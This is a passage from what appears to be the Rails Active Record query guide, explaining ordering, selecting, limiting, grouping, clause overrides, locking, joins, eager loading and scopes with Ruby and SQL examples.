# OR
Book.order(created_at: :asc)
# OR
Book.order("created_at DESC")
# OR
Book.order("created_at ASC")
```

You could also order by multiple fields:

```ruby
Book.order(title: :asc, created_at: :desc)
# OR
Book.order(:title, created_at: :desc)
# OR
Book.order("title ASC, created_at DESC")
# OR
Book.order("title ASC", "created_at DESC")
```

If you want to call `order` multiple times, subsequent orders will be appended
to the first:

```irb
store(dev)> Book.order("title ASC").order("created_at DESC")
SELECT * FROM books ORDER BY title ASC, created_at DESC
```

You can also order from a joined table:

```ruby
Book.includes(:author).order(books: { print_year: :desc }, authors: { name: :asc })
# OR
Book.includes(:author).order("books.print_year desc", "authors.name asc")
```

WARNING: In most database systems, when using `distinct` with methods like
`select`, `pluck`, or `ids`, the `order` method will raise an
`ActiveRecord::StatementInvalid` exception unless the field(s) used in the
`order` clause are included in the select list. See the next section for
selecting fields from the result set.

Selecting Fields
----------------

By default, `ActiveRecord::Relation` selects all the fields from the result set
using `select *`.

To select only a subset of fields from the result set, you can specify the
subset via the [`select`][] method.

For example, to select only `isbn` and `out_of_print` columns:

```ruby
Book.select(:isbn, :out_of_print)
# OR
Book.select("isbn, out_of_print")

```

The SQL query used by this find call will be somewhat like:

```sql
SELECT isbn, out_of_print FROM books
```

Be careful because this also means you're initializing a model record with only
the fields that you've selected. If you attempt to access a field that is not in
the initialized record you'll receive the following error:

```text
ActiveModel::MissingAttributeError: missing attribute '<attribute>' for Book
```

In the above example, `<attribute>` would be the requested attribute. The `id`
method will not raise the `ActiveModel::MissingAttributeError`, so exercise
caution when working with associations, which need the `id` method to function
properly.

Limiting Records
----------------

To limit the number of records retrieved from the database you can use the
[`limit`][] and [`offset`][] methods on the relation.

The limit method specifies how many records should be returned, while offset
determines how many records to skip before retrieving results. For example:

```ruby
Customer.limit(5)
```

This example will return a maximum of 5 customers, and because it specifies no
offset, the first 5 in the table will be returned. The SQL it executes looks
like this:

```sql
SELECT * FROM customers LIMIT 5
```

Adding `offset` to that will skip the first 30 records and return the next 5,
starting from the 31st record:

```ruby
Customer.limit(5).offset(30)
```

The SQL generated by this query looks like:

```sql
SELECT * FROM customers LIMIT 5 OFFSET 30
```

If you would like to only return a single record for each unique value in a
given field, you can use [`distinct`][]:

```ruby
Customer.select(:last_name).distinct
```

This will generate SQL like:

```sql
SELECT DISTINCT last_name FROM customers
```

You can also remove the uniqueness constraint:

```ruby
# Returns a unique list of last_names
query = Customer.select(:last_name).distinct

# Returns a list of all last_names, even if there are duplicates
query.distinct(false)
```

Grouping Records
----------------

If you want to group records, you can use the [`group`][] method to apply a
`GROUP BY` clause to the SQL generated by the relation.

For example, if you want to find a collection of orders grouped by status:

```ruby
Order.group("status")
```

And this will give you a single `Order` record for each unique status value in
the database.

The SQL that would be executed would be something like this:

```sql
SELECT *
  FROM orders
  GROUP BY status
```

### Total of Grouped Items

To count the items in each group, call [`count`][] after the `group` method.

```irb
store(dev)> Order.group(:status).count
=> {"being_packed"=>7, "shipped"=>12}
```

The SQL that would be executed looks like this:

```sql
SELECT COUNT (*) AS count_all, status AS status
  FROM orders
  GROUP BY status
```

[`count`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Calculations.html#method-i-count

### HAVING Conditions

To filter the results of a grouped query, you can use the [`having`][] method.

Unlike `where`, which filters rows before grouping, `having` filters the groups
after they have been aggregated.

For example:

```ruby
Order.select("customer_id, sum(total) as total_price").
  group("customer_id").having("sum(total) > ?", 200)
```

The SQL that would be executed would be something like this:

```sql
SELECT customer_id, sum(total) as total_price
  FROM orders
  GROUP BY customer_id
  HAVING sum(total) > 200
```

This returns the customer ID and total price for each customer, grouped by
customer, whose total order value exceeds $200.

You can access the `total_price` for each order record returned like this:

```ruby
big_orders = Order.select("customer_id, sum(total) as total_price")
                  .group("customer_id")
                  .having("sum(total) > ?", 200)

big_orders[0].total_price
# Returns the total price for the first Order record
```

Overriding Clauses
------------------

There are times when you want to build on an existing relation but change part
of its query by removing conditions, replacing them, or redefining how records
are selected or ordered. Active Record provides several methods that allow you
to override individual clauses without rebuilding the entire relation from
scratch.

### `unscope`

You can specify certain conditions to be removed using the [`unscope`][] method.
For example:

```ruby
Book.where("id > 100").limit(20).order("id desc").unscope(:order)
```

The SQL that would be executed:

```sql
SELECT *
  FROM books
  WHERE id > 100
  LIMIT 20

-- Original query without `unscope`
SELECT *
  FROM books
  WHERE id > 100
  ORDER BY id desc
  LIMIT 20
```

You can also unscope specific `where` clauses. For example, this will remove the
`id` condition from the where clause:

```ruby
Book.where(id: 10, out_of_print: false).unscope(where: :id)
```

This will generate the following SQL:

```sql
SELECT books.* FROM books WHERE out_of_print = false
```

A relation which has used `unscope` will affect any relation into which it is
merged. In the following example the `order` is removed from the original
relation:

```ruby
Book.order("id desc").merge(Book.unscope(:order))
```

This will generate the following SQL:

```sql
SELECT books.* FROM books
```

[`unscope`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-unscope

### `unscoped`

If we wish to remove all scoping for any reason we can use the [`unscoped`][]
method. This is especially useful if a `default_scope` is specified in the model
but should not be applied for this particular query. However, `unscoped` can be
used even when no scopes are present.

```ruby
Book.unscoped.load
```

This method removes all scoping and will do a normal query on the table.

```ruby
Book.unscoped.all
```

```ruby
Book.where(out_of_print: true).unscoped.all
```

Both of the above will generate the following SQL:

```sql
SELECT books.* FROM books
```

`unscoped` can also accept a block:

```ruby
Book.unscoped { Book.out_of_print }
```

```sql
SELECT books.* FROM books WHERE books.out_of_print = true
```

[`unscoped`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Scoping/Default/ClassMethods.html#method-i-unscoped

### `only`

You can override conditions using the [`only`][] method.  In the following
example only the `:order` and `:where` scopes are applied, but the `:limit`
scope is removed:

```ruby
Book.where("id > 10").limit(20).order("id desc").only(:order, :where)
```

The SQL that would be executed:

```sql
SELECT *
  FROM books
  WHERE id > 10
  ORDER BY id DESC

-- Original query without `only`
SELECT *
  FROM books
  WHERE id > 10
  ORDER BY id DESC
  LIMIT 20
```

[`only`]:
    https://api.rubyonrails.org/classes/ActiveRecord/SpawnMethods.html#method-i-only

### `except`

You can remove specific conditions using the [`except`][] method. For example:

```ruby
Book.where("id > 100").limit(20).order("id desc").except(:order)
```

The SQL that will be executed ignores the `:order` clause:

```sql
SELECT *
  FROM books
  WHERE id > 100
  LIMIT 20

-- Original query without `except`
SELECT *
  FROM books
  WHERE id > 100
  ORDER BY id desc
  LIMIT 20
```

You can also remove multiple conditions:

```ruby
Book.where("id > 100").limit(20).order("id desc").except(:order, :limit)
```

This will generate the following SQL:

```sql
SELECT books.* FROM books WHERE id > 100
```

[`except`]:
    https://api.rubyonrails.org/classes/ActiveRecord/SpawnMethods.html#method-i-except

### `reselect`

The [`reselect`][] method overrides an existing select statement. For example:

```ruby
Book.select(:title, :isbn).reselect(:created_at)
```

This will generate the following SQL:

```sql
SELECT books.created_at FROM books
```

Compare this to the case where the `reselect` clause is not used:

```ruby
Book.select(:title, :isbn).select(:created_at)
```

This will generate the following SQL:

```sql
SELECT books.title, books.isbn, books.created_at FROM books
```

### `reorder`

The [`reorder`][] method overrides any previously defined order clause. For
example, if the class definition includes this:

```ruby
class Book < ApplicationRecord
  default_scope { order(year_published: :desc) }
end
```

And you execute this:

```ruby
Book.all
```

This will generate the following SQL:

```sql
SELECT *
  FROM books
  ORDER BY year_published DESC
```

You can use the `reorder` clause to specify a different order:

```ruby
Book.reorder("year_published ASC")
```

The SQL that would be executed:

```sql
SELECT *
  FROM books
  ORDER BY year_published ASC
```

The `reorder` method also works with any previously defined order, not just
association order:

```ruby
Book.where("id > 100").order("id desc").reorder("title ASC")
```

This will override the previous `order("id desc")` clause and only order by
title.

### `reverse_order`

The [`reverse_order`][] method reverses the ordering clause if specified.

```ruby
Book.where("author_id > 10").order(:year_published).reverse_order
```

The SQL that would be executed sets the order to be `DESC`:

```sql
SELECT * FROM books WHERE author_id > 10 ORDER BY year_published DESC
```

If no ordering clause is specified in the query, the `reverse_order` orders by
the primary key in reverse order.

```ruby
Book.where("author_id > 10").reverse_order
```

The SQL that would be executed:

```sql
SELECT * FROM books WHERE author_id > 10 ORDER BY books.id DESC
```

The `reverse_order` method accepts **no** arguments.

### `rewhere`

The [`rewhere`][] method overrides an existing, named `where` condition. For
example:

```ruby
Book.where(out_of_print: true).rewhere(out_of_print: false)
```

The SQL that would be executed:

```sql
SELECT * FROM books WHERE out_of_print = false
```

If a regular `where` is used instead, the conditions are combined with AND
rather than replaced:

```ruby
Book.where(out_of_print: true).where(out_of_print: false)
```

The SQL that would be executed:

```sql
SELECT * FROM books WHERE out_of_print = true AND out_of_print = false
```

[`rewhere`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-rewhere


### `regroup`

The [`regroup`][] method overrides an existing, named `group` condition. For
example:

```ruby
Book.group(:author_id).regroup(:id)
```

The SQL that would be executed groups by the regrouped columns:

```sql
SELECT * FROM books GROUP BY id
```

If a regular `group` is used instead of the `regroup` clause, the group clauses
are combined together:

```ruby
Book.group(:author_id).group(:id)
```

The SQL executed would be:

```sql
SELECT * FROM books GROUP BY author_id, id
```

[`regroup`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-regroup


Null Relation
-------------

The [`none`][] method returns a chainable relation with no records. Any
subsequent conditions chained to the returned relation will continue generating
empty relations. This is useful in scenarios where you need a chainable response
to a method or a scope that could return zero results.

```ruby
Book.none # returns an empty Relation and fires no queries.
```

```ruby
class Book
  # Returns reviews if there are at least 5,
  # else consider this as non-reviewed book
  def highlighted_reviews
    if reviews.count >= 5
      reviews
    else
      Review.none # Does not meet minimum threshold yet
    end
  end
end

# The highlighted_reviews method is expected to always return a Relation.
Book.first.highlighted_reviews.average(:rating)
# => Returns average rating of a book even when there are less than 5 reviews.
```

Readonly Records
----------------

Active Record provides the [`readonly`][] method on a relation to explicitly
disallow modification of any of the returned records. Any attempt to alter a
readonly record will not succeed, raising an `ActiveRecord::ReadOnlyRecord`
exception.

```ruby
customer = Customer.readonly.first
customer.visits += 1
customer.save # Raises an ActiveRecord::ReadOnlyRecord
```

As `customer` is explicitly set to be a readonly record, the above code will
raise an `ActiveRecord::ReadOnlyRecord` exception when calling `customer.save`
with an updated value of _visits_.

Locking Records for Update
--------------------------

Locking is helpful for preventing race conditions when updating records in the
database and ensuring atomic updates.

NOTE: An atomic operation is one that completes entirely or not at all,
preventing partial updates from being visible to other processes.

Active Record provides two locking mechanisms:

* Optimistic Locking
* Pessimistic Locking

### Optimistic Locking

Optimistic locking allows multiple users to access the same record for edits,
and assumes a minimum of conflicts with the data. It does this by checking
whether another process has made changes to a record since it was opened. An
`ActiveRecord::StaleObjectError` exception is thrown if that has occurred and
the update is ignored.

#### Optimistic locking column

In order to use optimistic locking, the table needs to have a column called
`lock_version` of type integer. Each time the record is updated, Active Record
increments the `lock_version` column. If an update request is made with a lower
value in the `lock_version` field than is currently in the `lock_version` column
in the database, the update request will fail with an
`ActiveRecord::StaleObjectError`.

For example:

```ruby
c1 = Customer.find(1)
c2 = Customer.find(1)

c1.first_name = "Sandra"
c1.save

c1.lock_version # => 1
c2.lock_version # => 0

c2.first_name = "Michael"
c2.save  # Raises an ActiveRecord::StaleObjectError
```

You're then responsible for dealing with the conflict by rescuing the exception
and either rolling back, merging, or otherwise applying the business logic
needed to resolve the conflict.

This behavior can be turned off by setting
`ActiveRecord::Base.lock_optimistically = false`.

To override the name of the `lock_version` column, `ActiveRecord::Base` provides
a class attribute called `locking_column`:

```ruby
class Customer < ApplicationRecord
  self.locking_column = :lock_customer_column
end
```

### Pessimistic Locking

Pessimistic locking uses a locking mechanism provided by the underlying
database. Using [`lock`][] when building a relation obtains an exclusive lock on
the selected rows. Relations using `lock` are usually wrapped inside a
transaction for preventing deadlock conditions.

For example:

```ruby
Book.transaction do
  book = Book.lock.first
  book.title = "Algorithms, second edition"
  book.save!
end
```

The above session produces the following SQL for a MySQL backend:

```sql
SQL (0.2ms)   BEGIN
Book Load (0.3ms)   SELECT * FROM books LIMIT 1 FOR UPDATE
Book Update (0.4ms)   UPDATE books SET updated_at = "2009-02-07 18:05:56", title = "Algorithms, second edition" WHERE id = 1
SQL (0.8ms)   COMMIT
```

You can also pass raw SQL to the [`lock`][] method for allowing different types
of locks. For example, MySQL has an expression called `LOCK IN SHARE MODE` where
you can lock a record but still allow other queries to read it. To specify this
expression just pass it in as the lock option:

```ruby
Book.transaction do
  book = Book.lock("LOCK IN SHARE MODE").find(1)
  book.increment!(:views)
end
```

WARNING: Your database needs to support the raw SQL that you pass in to the
`lock` method, otherwise an `ActiveRecord::StatementInvalid` exception will be
raised.

If you already have an instance of your model, you can start a transaction and
acquire the lock in one go using the [`with_lock`][] method. The block receives
the current transaction so you can register callbacks:

```ruby
book = Book.first
# Reload book with a lock before yielding.
book.with_lock do |transaction|
  # This block is called within a transaction,
  # book is already locked.
  transaction.after_commit { puts "hello" }
  book.increment!(:views)
end
```

Joining Tables
--------------

Joining tables allows you to retrieve records from multiple tables in a single
query, for example, fetching books together with their authors.

Active Record provides two finder methods for specifying `JOIN` clauses on the
resulting SQL; [`joins`][] and [`left_outer_joins`][]:

- `joins` should be used for `INNER JOIN` or custom queries
- `left_outer_joins` should be used for queries using `LEFT OUTER JOIN`

### `joins`

There are multiple ways to use the `joins` method.

#### Using a String SQL Fragment

You can just supply the raw SQL specifying the `JOIN` clause to `joins`:

```ruby
Author.joins("INNER JOIN books ON books.author_id = authors.id AND books.out_of_print = FALSE")
```

This will result in the following SQL:

```sql
SELECT authors.* FROM authors
  INNER JOIN books ON books.author_id = authors.id AND books.out_of_print = FALSE
```

#### Using Array/Hash of Named Associations

Active Record lets you use the names of the
[associations](association_basics.html) defined on the model as a shortcut for
specifying `JOIN` clauses for those associations when using the `joins` method.

All of the following will produce the expected join queries using `INNER JOIN`:

##### Joining a Single Association

Pass the name of the association to join a single table:

```ruby
Book.joins(:reviews)
```

This produces the following SQL:

```sql
SELECT books.* FROM books
  INNER JOIN reviews ON reviews.book_id = books.id
```

The SQL query will return a Book record for all books with reviews.

NOTE: You will see duplicate books if a book has more than one review.  If you
want unique books, you can use `Book.joins(:reviews).distinct`.

##### Joining Multiple Associations

Pass multiple association names to join multiple tables:

```ruby
Book.joins(:author, :reviews)
```

This produces the following SQL:

```sql
SELECT books.* FROM books
  INNER JOIN authors ON authors.id = books.author_id
  INNER JOIN reviews ON reviews.book_id = books.id
```

The SQL query will return all books that have an author _and_ at least one
review.

NOTE: You will see duplicate books if a book has more than one review.  If you
want unique books, you can use `Book.joins(:reviews).distinct`.


##### Joining Nested Associations (Single Level)

Pass a hash of association names to join tables on other joined tables:

```ruby
Book.joins(reviews: :customer)
```

This produces the following SQL:

```sql
SELECT books.* FROM books
  INNER JOIN reviews ON reviews.book_id = books.id
  INNER JOIN customers ON customers.id = reviews.customer_id
```

The SQL query will return all books that have a review by a customer.

##### Joining Nested Associations (Multiple Level)

For more complex joining, use a combination of hashes and arrays:

```ruby
Author.joins(books: [{ reviews: { customer: :orders } }, :supplier])
```

This produces the following SQL:

```sql
SELECT authors.* FROM authors
  INNER JOIN books ON books.author_id = authors.id
  INNER JOIN reviews ON reviews.book_id = books.id
  INNER JOIN customers ON customers.id = reviews.customer_id
  INNER JOIN orders ON orders.customer_id = customers.id
  INNER JOIN suppliers ON suppliers.id = books.supplier_id
```

The SQL query will return all authors that have a book which has
both a review from a customer that has placed an order _and_ a supplier.

#### Specifying Conditions on the Joined Tables

You can specify conditions on the joined tables using the regular
[Array](#array-conditions) and [String](#pure-string-conditions) conditions.
[Hash conditions](#hash-conditions) provide a special syntax for specifying
conditions for the joined tables:

```ruby
time_range = (Time.now.midnight - 1.day)..Time.now.midnight
Customer.joins(:orders).where("orders.created_at" => time_range).distinct
```

This will find all customers who have orders that were created yesterday, using
a `BETWEEN` SQL expression to compare `created_at`.

An alternative and cleaner syntax is to nest the hash conditions:

```ruby
time_range = (Time.now.midnight - 1.day)..Time.now.midnight
Customer.joins(:orders).where(orders: { created_at: time_range }).distinct
```

For more advanced conditions or to reuse an existing named scope, [`merge`][]
may be used. First, let's add a new named scope to the `Order` model:

```ruby
class Order < ApplicationRecord
  belongs_to :customer

  scope :created_in_time_range, ->(time_range) {
    where(created_at: time_range)
  }
end
```

Now we can use `merge` to merge in the `created_in_time_range` scope:

```ruby
time_range = (Time.now.midnight - 1.day)..Time.now.midnight
Customer.joins(:orders).merge(Order.created_in_time_range(time_range)).distinct
```

This will find all customers who have orders that were created yesterday, again
using a `BETWEEN` SQL expression.

### `left_outer_joins`

Inner joins will only return records that have the associated records.

If you want to select a set of records whether or not they have associated
records you can use the [`left_outer_joins`][] method.

```ruby
Customer.left_outer_joins(:reviews).distinct.select("customers.*, COUNT(reviews.*) AS reviews_count").group("customers.id")
```

This produces the following SQL:

```sql
SELECT DISTINCT customers.*, COUNT(reviews.*) AS reviews_count FROM customers
  LEFT OUTER JOIN reviews ON reviews.customer_id = customers.id
  GROUP BY customers.id
```

It will return all customers with their count of reviews, whether or not they
have any reviews at all

### `where.associated` and `where.missing`

The `associated` and `missing` query methods let you select a set of records
based on the presence or absence of an association.

To use `where.associated`, begin with an empty `where` followed by `associated`
with the association name:

```ruby
Customer.where.associated(:reviews)
```

This produces the following SQL:

```sql
SELECT customers.* FROM customers
  INNER JOIN reviews ON reviews.customer_id = customers.id
  WHERE reviews.id IS NOT NULL
```

The SQL query will return all customers that have made at least one review.

`where.missing` is the opposite of `where.associated`. You can use
`where.missing` to select records that do not have an association:

```ruby
Customer.where.missing(:reviews)
```

This produces the following SQL:

```sql
SELECT customers.* FROM customers
  LEFT OUTER JOIN reviews ON reviews.customer_id = customers.id
  WHERE reviews.id IS NULL
```

The SQL query will return all customers that have not made any reviews.

If a join is already defined `associated` will use that join instead:

```ruby
# associated will use LEFT JOIN for this query instead of using JOIN
Post.left_joins(:author).where.associated(:author)
```

Eager Loading Associations
--------------------------

Eager loading is the mechanism for loading the associated records of the objects
returned by `ActiveRecord::Relation` using the most performant queries possible.

### N + 1 Queries Problem

Retrieving a list of records N (where N is a number greater than 1) in a single
query can sometimes trigger N extra queries; one for each record.

Consider the following code, which finds 10 books and prints their authors'
last_name:

```ruby
books = Book.limit(10)

books.each do |book|
  puts book.author.last_name
end
```

This code looks fine at the first sight, but the problem lies within the total
number of queries executed. The above code executes 1 (to find 10 books) + 10
(one per each book to load the author) = **11** queries in total.

#### Solution to N + 1 Queries Problem

Active Record lets you specify in advance all the associations that are going to
be loaded.

The methods are:

* [`includes`][]
* [`preload`][]
* [`eager_load`][]

INFO: Prefer using [`includes`][], as it is a higher-level method that will use
either [`preload`][] or [`eager_load`][] depending on the query.

### `includes`

With `includes`, Active Record tries to load the specified associations using
the most performant queries.

Revisiting the above case using the `includes` method, we could rewrite
`Book.limit(10)` to eager load authors:

```ruby
books = Book.includes(:author).limit(10)

books.each do |book|
  puts book.author.last_name
end
```

The above code will execute just **2** queries, as opposed to the **11** queries
from the original case:

```sql
SELECT books.* FROM books
  LIMIT 10

SELECT authors.* FROM authors
  WHERE authors.id IN (1,2,3,4,5,6,7,8,9,10)
```

#### Eager Loading Multiple Associations

Active Record lets you eager load any number of associations with a single
`ActiveRecord::Relation` call by using an array, hash, or a nested hash of
array/hash with the `includes` method.

To eager load multiple associations pass an array of association names:

```ruby
Customer.includes(:orders, :reviews)
```

This loads all the customers and the associated orders and reviews for each.

To eager load nested associations, pass a hash:

```ruby
Customer.includes(orders: { books: [:supplier, :author] }).find(1)
```

This will find the customer with id 1 and eager load all of the associated
orders for it, the books for all of the orders, and the author and supplier for
each of the books.

Even though Active Record allows you to specify conditions on eager-loaded
associations, the recommended approach is to use [joins](#joining-tables) for
this type of query.

However if you must do this, you may use `where` as you would normally.

```ruby
Author.includes(:books).where(books: { out_of_print: true })
```

This will generate a query which contains a `LEFT OUTER JOIN` whereas the
`joins` method will generate one using the `INNER JOIN` function instead.

```sql
  SELECT authors.id AS t0_r0, ... books.updated_at AS t1_r5 FROM authors
    LEFT OUTER JOIN books ON books.author_id = authors.id
    WHERE (books.out_of_print = true)
```

If there was no `where` condition, this will generate the normal set of two
queries.

NOTE: Using `where` like this will only work when you pass it a Hash. For
SQL-fragments you need to use [`references`][] to force joined tables:

```ruby
Author.includes(:books).where("books.out_of_print = true").references(:books)
```

If, in the case of this `includes` query, there were no books for any authors,
all the authors would still be loaded. By using `joins` (an INNER JOIN), the
join conditions **must** match, otherwise no records will be returned.

NOTE: If an association is eager loaded as part of a join, any fields from a
custom select clause will not be present on the loaded models. This is because
it is ambiguous whether they should appear on the parent record, or the child.

INFO: Prefer using `includes`, as it is a higher-level method that chooses
between separate queries and a `LEFT OUTER JOIN` depending on the query.

### `preload`

With `preload`, Active Record loads each specified association using one query
per association. This is exactly the same as what `includes` will do when there
are no conditions.

Revisiting the N + 1 queries problem, we could rewrite `Book.limit(10)` to
preload authors:


```ruby
books = Book.preload(:author).limit(10)

books.each do |book|
  puts book.author.last_name
end
```

The above code will execute just **2** queries, as opposed to the **11** queries
from the original case:

```sql
SELECT books.* FROM books
  LIMIT 10

SELECT authors.* FROM authors
  WHERE authors.id IN (1,2,3,4,5,6,7,8,9,10)
```

NOTE: The `preload` method uses an array, hash, or a nested hash of array/hash
in the same way as the `includes` method to load any number of associations with
a single `ActiveRecord::Relation` call. In simple cases, this is the same
strategy that `includes` uses. However, unlike the `includes` method, it is not
possible to specify conditions for preloaded associations.

### `eager_load`

With `eager_load`, Active Record loads all specified associations using a `LEFT
OUTER JOIN`.

Revisiting the case where N + 1 queries occurred using the `eager_load` method,
we could rewrite `Book.limit(10)` to eager load authors:

```ruby
books = Book.eager_load(:author).limit(10)

books.each do |book|
  puts book.author.last_name
end
```

The above code will execute just **1** query, as opposed to the **11** queries
from the original case:

```sql
SELECT "books"."id" AS t0_r0, "books"."title" AS t0_r1, ... FROM "books"
  LEFT OUTER JOIN "authors" ON "authors"."id" = "books"."author_id"
  LIMIT 10
```

NOTE: The `eager_load` method uses an array, hash, or a nested hash of
array/hash in the same way as the `includes` method to load any number of
associations with a single `ActiveRecord::Relation` call. Also, like the
`includes` method, you can specify conditions for eager loaded associations.

### `strict_loading`

Eager loading can prevent N + 1 queries but you might still be lazy loading some
associations. To make sure no associations are lazy loaded you can enable
[`strict_loading`][].

By enabling strict loading mode on a relation, an
`ActiveRecord::StrictLoadingViolationError` will be raised if the record tries
to lazily load any association:

```ruby
user = User.strict_loading.first
user.address.city # raises an ActiveRecord::StrictLoadingViolationError
user.comments.to_a # raises an ActiveRecord::StrictLoadingViolationError
```

To enable strict loading for all relations, change
[`config.active_record.strict_loading_by_default`][] to `true`:

```ruby
config.active_record.strict_loading_by_default = true
```

To send violations to the logger instead, change
[`config.active_record.action_on_strict_loading_violation`][] to `:log`:

```ruby
config.active_record.action_on_strict_loading_violation = :log
```

[`strict_loading`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-strict_loading
[`config.active_record.strict_loading_by_default`]:
    configuring.html#config-active-record-strict-loading-by-default
[`config.active_record.action_on_strict_loading_violation`]:
    configuring.html#config-active-record-action-on-strict-loading-violation

### `strict_loading!`

We can also enable strict loading on the record itself by calling
[`strict_loading!`][]:

```ruby
user = User.first
user.strict_loading!
user.address.city # raises an ActiveRecord::StrictLoadingViolationError
user.comments.to_a # raises an ActiveRecord::StrictLoadingViolationError
```

`strict_loading!` also takes a `:mode` argument. Setting it to
`:n_plus_one_only` will only raise an error if an association that will lead to
an N + 1 query is lazily loaded:

```ruby
user.strict_loading!(mode: :n_plus_one_only)
user.address.city # => "Tatooine"
user.comments.to_a # => [#<Comment:0x00...]
user.comments.first.likes.to_a # raises an ActiveRecord::StrictLoadingViolationError
```

[`strict_loading!`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Core.html#method-i-strict_loading-21

### `strict_loading` option on an association

We can also enable strict loading for a single association by providing the
`strict_loading` option:

```ruby
class Author < ApplicationRecord
  has_many :books, strict_loading: true
end
```

Scopes
------

Scoping allows you to specify commonly-used queries which can be referenced as
method calls on the association objects or models. With these scopes, you can
use every method previously covered such as `where`, `joins` and `includes`. All
scope bodies should return an `ActiveRecord::Relation` or `nil` to allow for
further methods (such as other scopes) to be called on it.

To define a simple scope, we use the [`scope`][] method inside the class,
passing the query that we'd like to run when this scope is called:

```ruby
class Book < ApplicationRecord
  scope :out_of_print, -> { where(out_of_print: true) }
end
```

To call this `out_of_print` scope we can call it on either the class:

```irb
store(dev)> Book.out_of_print
=> #<ActiveRecord::Relation> # all out of print books
```

Or on an association consisting of `Book` records:

```irb
store(dev)> author = Author.first
store(dev)> author.books.out_of_print
=> #<ActiveRecord::Relation> # all out of print books by `author`
```

[`scope`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Scoping/Named/ClassMethods.html#method-i-scope

### Passing in Arguments

Your scope can take arguments:

```ruby
class Book < ApplicationRecord
  scope :costs_more_than, ->(amount) { where("price > ?", amount) }
end
```

Call the scope as if it were a class method:

```irb
store(dev)> Book.costs_more_than(100.10)
```

However, this is just duplicating the functionality that would be provided to
you by a class method.

```ruby
class Book < ApplicationRecord
  def self.costs_more_than(amount)
    where("price > ?", amount)
  end
end
```

These methods will still be accessible on the association objects:

```irb
store(dev)> author.books.costs_more_than(100.10)
```

### Using Conditionals

Your scope can utilize conditionals:

```ruby
class Order < ApplicationRecord
  scope :created_before, ->(time) { where(created_at: ...time) if time.present? }
end
```

Like the other examples, this will behave similarly to a class method.

```ruby
class Order < ApplicationRecord
  def self.created_before(time)
    where(created_at: ...time) if time.present?
  end
end
```

However, there is one important caveat: A scope will always return an
`ActiveRecord::Relation` object, even if the conditional evaluates to `false`,
whereas a class method, will return `nil`. This can cause `NoMethodError` when
chaining class methods with conditionals, if any of the conditionals return
`false`.

To make a class method behave like a scope (always return an
`ActiveRecord::Relation`), you can return `self` when the conditional evaluates
to `false`:

```ruby
class Order < ApplicationRecord
  def self.created_before(time)
    if time.present?
      where(created_at: ...time)
    else
      self
    end
  end
end
```

This way, the class method will always return an `ActiveRecord::Relation`
object, making it safe to chain just like a scope.

### Applying a Default Scope

If you want a scope to be applied across all queries to the model, you can use
the [`default_scope`][] method within the model itself.

```ruby
class Book < ApplicationRecord
  default_scope { where(out_of_print: false) }
end
```

When queries are executed on this model, the SQL query will now look something
like this:

```sql
SELECT * FROM books WHERE (out_of_print = false)
```

If you need to do more complex things with a default scope, you can
alternatively define it as a class method:

```ruby
class Book < ApplicationRecord
  def self.default_scope
    # Should return an ActiveRecord::Relation.
  end
end
```

The `default_scope` is also applied while creating/building a record when the
scope arguments are given as a `Hash`. It is not applied while updating a
record.

For example, if you have a `default_scope` that sets `out_of_print` to `false`,
and you create a new book with the `out_of_print` attribute set to `true`, the
`default_scope` will be applied:

```ruby
class Book < ApplicationRecord
  default_scope { where(out_of_print: false) }
end
```

```irb
store(dev)> Book.new
=> #<Book id: nil, out_of_print: false>
store(dev)> Book.unscoped.new
=> #<Book id: nil, out_of_print: nil>
```

Be aware that when scope arguments are given as an `Array`, `default_scope`
cannot convert the arguments to a `Hash` for default attribute assignment. For
example:

```ruby
class Book < ApplicationRecord
  default_scope { where("out_of_print = ?", false) }
end
```

```irb
store(dev)> Book.new
=> #<Book id: nil, out_of_print: nil>
```

[`default_scope`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Scoping/Default/ClassMethods.html#method-i-default_scope

### Merging of Scopes

When you call multiple scopes sequentially, just like `where` clauses, scopes
are merged using `AND` conditions.

```ruby
class Book < ApplicationRecord
  scope :in_print, -> { where(out_of_print: false) }
  scope :out_of_print, -> { where(out_of_print: true) }

  scope :old, -> { where(year_published: ...50.years.ago.year) }
end
```

```irb
store(dev)> Book.out_of_print.old
SELECT books.* FROM books WHERE books.out_of_print = "true" AND books.year_published < 1969
```

Scopes can also call other scopes:

```ruby#4
class Book < ApplicationRecord
  scope :out_of_print, -> { where(out_of_print: true) }
  scope :old, -> { where(year_published: ...50.years.ago.year) }
  scope :out_of_print_and_old, -> { out_of_print.old }
end
```

You can mix and match `scope` and `where` conditions and the final SQL will have
all conditions joined with `AND` conditions.

```irb
store(dev)> Book.in_print.where(price: ...100)
SELECT books.* FROM books WHERE books.out_of_print = "false" AND books.price < 100
```

If you want the last `where` clause to take precedence over the previous `scope`
conditions, you can use the [`merge`][] method.

```irb
store(dev)> Book.in_print.merge(Book.out_of_print)
SELECT books.* FROM books WHERE books.out_of_print = true
```

One important caveat is that `default_scope` will be prepended in `scope` and
`where` conditions.

For example:

```ruby
class Book < ApplicationRecord
  default_scope { where(year_published: 50.years.ago.year..) }

  scope :in_print, -> { where(out_of_print: false) }
  scope :out_of_print, -> { where(out_of_print: true) }
end
```

```irb
store(dev)> Book.all
SELECT books.* FROM books WHERE (year_published >= 1969)

store(dev)> Book.in_print
SELECT books.* FROM books WHERE (year_published >= 1969) AND books.out_of_print = false

store(dev)> Book.where(year_published: 2020)
SELECT books.* FROM books WHERE (year_published >= 1969) AND (year_published = 2020)
```

The `default_scope` is merged in both `scope` and `where` conditions.

[`merge`]:
    https://api.rubyonrails.org/classes/ActiveRecord/SpawnMethods.html#method-i-merge

### Block-Level Scoping

The [`scoping`][] method allows you to temporarily apply the current relation’s
conditions within a block. Any query executed inside the block will use the
scope of the relation.

#### Basic Usage

```ruby
Order.where(customer_id: 1).scoping do
  Order.first
end

# SELECT "orders".* FROM "orders" WHERE "orders"."customer_id" = ? ORDER BY "orders"."id" ASC LIMIT ?  [["customer_id", 1], ["LIMIT", 1]]
```

In this example, the `customer_id: 1` condition is applied automatically because
the block is executed within the relation’s scope.

#### Applying Scope To All Queries In The Block

